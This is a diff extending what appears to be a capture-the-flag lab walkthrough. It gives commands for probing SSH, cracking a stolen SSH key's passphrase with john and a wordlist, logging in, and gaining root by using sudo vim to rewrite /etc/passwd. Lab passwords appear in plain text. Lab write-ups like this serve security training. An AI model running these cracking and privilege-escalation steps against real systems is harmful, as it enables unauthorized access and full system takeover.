@@ -44,3 +44,27 @@ Password: bison2674\
 cat the token file
 
 ## Box 2 User
+When scanning box 2 from the user box, notice that 22/ssh is filtered\
+Run `nc -nvz 10.8.14.71 22` and notice that it's open\
+On the bisonator box, cd into `~/ftp/`\
+Use njones' key to ssh into .71\
+It requires a passphrase\
+So use ssh2john.py to crack the passphrase\
+`sudo find / -type f -iname 'ssh2john.py'`\
+`python /path/to/ssh2john.py njones_rsa > njones.hash`\
+`john njones.hash --wordlist=/usr/share/wordlists/rockyou.txt`\
+Passphrase: skittles
+
+SSH into box 2
+`ssh njones@10.8.14.71 -i njones_rsa`\
+Enter passphrase\
+Cat token
+
+## Box 2 Root
+Do `sudo -l` to see what the user has sudo rights too\
+Vim is the only thing listed\
+`sudo vim /etc/passwd`\
+(password is skittles)\
+Change njones to look like this:\
+njones:x:0:0:root and leave the rest of the line the same\
+su to njones and you should have root privs
